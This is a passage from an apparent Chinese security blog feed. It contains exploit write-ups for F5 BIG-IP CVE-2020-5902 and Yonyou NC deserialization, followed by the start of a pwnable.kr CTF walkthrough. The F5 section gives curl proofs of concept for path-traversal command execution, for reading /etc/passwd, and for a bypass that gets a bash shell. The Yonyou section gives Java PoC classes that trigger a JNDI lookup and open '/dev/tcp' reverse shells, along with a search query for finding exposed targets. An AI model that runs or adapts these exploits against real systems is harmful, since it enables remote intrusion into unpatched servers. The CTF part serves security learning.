class-name">CallException</span> var8<span class="token punctuation">)</span> <span class="token punctuation">{</span>            logger<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span>NLSEngine<span class="token punctuation">.</span><span class="token function">getString</span><span class="token punctuation">(</span><span class="token string">"ilx.workspace.error.TmshCommandFailed"</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">": "</span> <span class="token operator">+</span> var8<span class="token punctuation">.</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            error <span class="token operator">=</span> var8<span class="token punctuation">.</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    resultObject<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"output"</span><span class="token punctuation">,</span> output<span class="token punctuation">)</span><span class="token punctuation">;</span>    resultObject<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"error"</span><span class="token punctuation">,</span> error<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> resultObject<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>过滤函数<code>com.f5.form.ShellCommandValidator#checkForBadShellCharacters</code></p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">boolean</span> <span class="token function">checkForBadShellCharacters</span><span class="token punctuation">(</span>String value<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> cArray <span class="token operator">=</span> value<span class="token punctuation">.</span><span class="token function">toCharArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> cArray<span class="token punctuation">.</span>length<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">char</span> c <span class="token operator">=</span> cArray<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>c <span class="token operator">==</span> <span class="token string">'&amp;'</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">';'</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">'`'</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">'\''</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">'\\'</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">'"'</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">'|'</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">'*'</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">'?'</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">'~'</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">'&lt;'</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">'>'</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">'^'</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">'('</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">')'</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">'['</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">']'</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">'{'</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">'}'</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">'$'</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">'\n'</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">'\r'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><p>RCE： <a href="https://clouddocs.f5.com/cli/tmsh-reference/v13/commands/" target="_blank" rel="noopener">TMSH 命令参考</a></p><pre class=" language-shell"><code class="language-shell">curl -k 'https://[HOST]/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin'</code></pre><p>P.S. 实际这里的 RCE 在没绕过限制之前只是对于 F5 执行部分操作；另外说<code>list auth user admin</code>返回结果为空，那是因为 admin 处于未登录状态。</p><p>LFR:</p><pre class=" language-shell"><code class="language-shell">curl -k 'https://[HOST]/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd'</code></pre><p>DIR：</p><pre class=" language-shell"><code class="language-shell">curl -k 'https://[HOST]/tmui/login.jsp/..;/tmui/locallb/workspace/directoryList.jsp?directoryPath=/usr/local/'</code></pre><p>…</p><h2 id="RCE-限制绕过"><a href="#RCE-限制绕过" class="headerlink" title="RCE 限制绕过"></a>RCE 限制绕过</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>来自不知源分享</p><ol><li><p>修改alias劫持list命令为bash</p><pre class=" language-http"><code class="language-http">/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash</code></pre></li><li><p>写入bash文件</p><pre class=" language-http"><code class="language-http">/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/xxx&amp;content=id</code></pre></li><li><p>执行bash文件</p><pre class=" language-http"><code class="language-http">/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/xxx</code></pre></li><li><p>还原list命令</p><pre class=" language-http"><code class="language-http">/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=delete+cli+alias+private+list</code></pre></li></ol><h3 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h3><p><a href="https://github.com/rapid7/metasploit-framework/pull/13807/commits/0417e88ff24bf05b8874c953bd91600f10186ba4" target="_blank" rel="noopener">https://github.com/rapid7/metasploit-framework/pull/13807/commits/0417e88ff24bf05b8874c953bd91600f10186ba4</a></p><h2 id="修补·反序列化绕过"><a href="#修补·反序列化绕过" class="headerlink" title="..;修补·反序列化绕过"></a><code>..;</code>修补·反序列化绕过</h2><p>原理：<a href="https://www.criticalstart.com/f5-big-ip-remote-code-execution-exploit/" target="_blank" rel="noopener">https://www.criticalstart.com/f5-big-ip-remote-code-execution-exploit/</a><br>POC：<a href="https://github.com/Critical-Start/Team-Ares/blob/master/CVE-2020-5902/" target="_blank" rel="noopener">https://github.com/Critical-Start/Team-Ares/blob/master/CVE-2020-5902/</a></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ol><li><a href="https://nosec.org/home/detail/4501.html" target="_blank" rel="noopener">【安全通报】F5 BIG-IP 远程代码执行漏洞</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;code&gt;..;&lt;/code&gt; ? :)&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="F5" scheme="https://blog.sari3l.com/tags/F5/"/>
    
      <category term="CVE-2020-5902" scheme="https://blog.sari3l.com/tags/CVE-2020-5902/"/>
    
  </entry>
  
  <entry>
    <title>用友NC反序列化 简单分析</title>
    <link href="https://blog.sari3l.com/posts/608d18f0/"/>
    <id>https://blog.sari3l.com/posts/608d18f0/</id>
    <published>2020-06-17T05:21:18.000Z</published>
    <updated>2022-01-03T09:04:16.791Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者不为此承担任何责任。</p></blockquote><h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><h3 id="jwdp"><a href="#jwdp" class="headerlink" title="jwdp"></a>jwdp</h3><p>UClient 提供了 JVM 参数设置，在里面直接添加</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/608d18f0/15923660011340.jpg" alt="-w919"></p><p>或者在其目录下的 client.sec 中直接修改</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/608d18f0/15923662221799.jpg" alt="-w1021"></p><h3 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h3><p>注：本文只测试了6.5版本</p><p>fofa：<a href="https://fofa.so/result?qbase64=dGl0bGU9IllPTllPVSBOQyI%3D" target="_blank" rel="noopener">title=”YONYOU NC”</a></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>通过已有的资料，在nc.login.ui.LoginAssistant中有以下两点调用lookup</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/608d18f0/15923664561365.jpg" alt="-w1009"></p><p>最终由nc.bs.framework.rmi.RmiNCLocator#lookup，注意到是 remoteContext，所以这里是类似 RMI 利用中的 <strong>Client 通过向 RMI Registry 申请 lookup 操作进行序列化攻击</strong></p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/608d18f0/15923665837519.jpg" alt="-w692"></p><p>后面就进入到常规操作了，最后放下调用栈</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/608d18f0/15923679776836.jpg" alt="-w553"></p><p>注意可以先打向 ceye 或 dnslog.cn等，在UA中会显示 JDK 版本，方便确定后续 payload</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/608d18f0/15923716683106.jpg" alt="-w1453"></p><h2 id="Poc"><a href="#Poc" class="headerlink" title="Poc"></a>Poc</h2><pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> nc<span class="token punctuation">.</span>bs<span class="token punctuation">.</span>framework<span class="token punctuation">.</span>common<span class="token punctuation">.</span>NCLocator<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Properties<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">poc</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">attack</span><span class="token punctuation">(</span>String url<span class="token punctuation">,</span> String jndipath<span class="token punctuation">)</span> <span class="token punctuation">{</span>        Properties env <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Properties</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>url<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"http"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            url <span class="token operator">=</span> <span class="token string">"http://"</span> <span class="token operator">+</span> url<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        env<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"SERVICEDISPATCH_URL"</span><span class="token punctuation">,</span> url <span class="token operator">+</span> <span class="token string">"/ServiceDispatcherServlet"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        NCLocator locator <span class="token operator">=</span> NCLocator<span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span>env<span class="token punctuation">)</span><span class="token punctuation">;</span>        locator<span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span>jndipath<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">attack</span><span class="token punctuation">(</span><span class="token string">"http://target"</span><span class="token punctuation">,</span> <span class="token string">"ldap://ip:port/classname"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>远程编译部署</p><pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span>Context<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span>Name<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span>spi<span class="token punctuation">.</span>ObjectFactory<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>Serializable<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Hashtable<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">remote</span> <span class="token keyword">implements</span> <span class="token class-name">ObjectFactory</span><span class="token punctuation">,</span> Serializable <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token function">remote</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">try</span><span class="token punctuation">{</span>            java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>Runtime<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span><span class="token string">"-c"</span><span class="token punctuation">,</span><span class="token string">"sh -i >&amp; /dev/tcp/ip/port 0>&amp;1"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> Object <span class="token function">getObjectInstance</span><span class="token punctuation">(</span>Object obj<span class="token punctuation">,</span> Name name<span class="token punctuation">,</span> Context nameCtx<span class="token punctuation">,</span> Hashtable<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token punctuation">,</span> <span class="token operator">?</span><span class="token operator">></span> environment<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        <span class="token keyword">return</span> null<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>当然也可以选择利用 nc 自带的类进行远程部署利用</p><pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> nc<span class="token punctuation">.</span>bs<span class="token punctuation">.</span>framework<span class="token punctuation">.</span>common<span class="token punctuation">.</span>ComponentMetaVO<span class="token punctuation">;</span><span class="token keyword">import</span> nc<span class="token punctuation">.</span>bs<span class="token punctuation">.</span>framework<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>RemoteAddressSelector<span class="token punctuation">;</span><span class="token keyword">import</span> nc<span class="token punctuation">.</span>bs<span class="token punctuation">.</span>framework<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>RemoteProxy<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">remote</span> <span class="token keyword">implements</span> <span class="token class-name">RemoteProxy</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token function">remote</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">try</span><span class="token punctuation">{</span>            java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>Runtime<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span><span class="token string">"-c"</span><span class="token punctuation">,</span><span class="token string">"sh -i >&amp; /dev/tcp/ip/port 0>&amp;1"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> Object <span class="token function">getAttribute</span><span class="token punctuation">(</span>String s<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> null<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setAttribute</span><span class="token punctuation">(</span>String s<span class="token punctuation">,</span> Object o<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> ComponentMetaVO <span class="token function">getComponentMetaVO</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> null<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">getRetryMax</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setRetryMax</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">long</span> <span class="token function">getRetryInterval</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setRetryInterval</span><span class="token punctuation">(</span><span class="token keyword">long</span> l<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setRemoteAddressSelector</span><span class="token punctuation">(</span>RemoteAddressSelector remoteAddressSelector<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> RemoteAddressSelector <span class="token function">getRemoteAddressSelector</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> null<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h3 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h3><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/608d18f0/mov.gif" alt="mov"></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ol><li><a href="https://nosec.org/home/detail/4472.html" target="_blank" rel="noopener">【安全通报】用友NC反序列化远程命令执行漏洞</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;欠了很久，简单分析下~&lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>Pwnable.kr 之 Toddler&#39;s Bottle</title>
    <link href="https://blog.sari3l.com/posts/d4fb29f2/"/>
    <id>https://blog.sari3l.com/posts/d4fb29f2/</id>
    <published>2020-06-14T14:54:02.000Z</published>
    <updated>2020-07-06T09:45:14.050Z</updated>
    
    <content type="html"><![CDATA[<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><ol><li><p>关于反汇编时函数显示 plt </p><ul><li>原因：<a href="https://www.binss.me/blog/plt-and-got/" target="_blank" rel="noopener">PLT与GOT</a></li><li>解决方案：<a href="https://reverseengineering.stackexchange.com/questions/19895/radares-aaaa-and-aa-what-does-it-do-exactly" target="_blank" rel="noopener">Radare’s <code>aaaa</code> and -AA what does it do, exactly?</a></li></ul></li><li><p>注意 pwndbg 对 heap 命令进行过一次大改，最后一次还易使用 commit 为 fbd2bb3abfc2500aae76d159e23015008e879b8d<br><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/d4fb29f2/15915160149123.jpg" alt="-w878"></p></li></ol><h2 id="1-fd"><a href="#1-fd" class="headerlink" title="1. [fd]"></a>1. [fd]</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><pre class=" language-c"><code class="language-c">fd@pwnable<span class="token punctuation">:</span><span class="token operator">~</span>$ cat fd<span class="token punctuation">.</span>c<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> envp<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>argc<span class="token operator">&lt;</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"pass argv[1] a number\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">int</span> fd <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x1234</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> len <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    len <span class="token operator">=</span> <span class="token function">read</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token string">"LETMEWIN\n"</span><span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"good job :)\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/cat flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"learn about Linux file IO\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>我们首先注意到 read 函数语法，暂时没找到</p><p>由于 fd 为传入可控，当我们将 fd=0x0时，即 fd=stdin 时，我们就可以控制 buf 内的内容，从而通过判断获取 flag</p><h3 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h3><pre class=" language-shell"><code class="language-shell">fd@pwnable:~$ ./fd 4660LETMEWINgood job :)mommy! I think I know what a file descriptor is!!</code></pre><h2 id="2-collision"><a href="#2-collision" class="headerlink" title="2. collision"></a>2. collision</h2><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> hashcode <span class="token operator">=</span> <span class="token number">0x21DD09EC</span><span class="token punctuation">;</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token function">check_password</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> p<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span><span class="token operator">*</span> ip <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token operator">*</span><span class="token punctuation">)</span>p<span class="token punctuation">;</span>    <span class="token keyword">int</span> i<span class="token punctuation">;</span>    <span class="token keyword">int</span> res<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">5</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        res <span class="token operator">+</span><span class="token operator">=</span> ip<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> res<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>argc<span class="token operator">&lt;</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"usage : %s [passcode]\n"</span><span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"passcode length should be 20 bytes\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>hashcode <span class="token operator">==</span> <span class="token function">check_password</span><span class="token punctuation">(</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/cat flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"wrong passcode.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><ol><li>限制传入值为 20 字节</li><li>将传入的内容分为 5 个 int 值</li><li>sum 之和需为 hashcode</li></ol><p>0x21DD09EC == 568134124 == 113626824*4 + 113626828</p><h3 id="解题-1"><a href="#解题-1" class="headerlink" title="解题"></a>解题</h3><pre class=" language-shell"><code class="language-shell">col@pwnable:~$ ./col `echo -e "\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xcc\xce\xc5\x06"`daddy! I just managed to create a hash collision :)</code></pre><p>或者</p><pre class=" language-shell"><code class="language-shell">col@pwnable:~$ ./col `printf "\xc8\xce\xc5\x06%0.s" {1..4} && printf 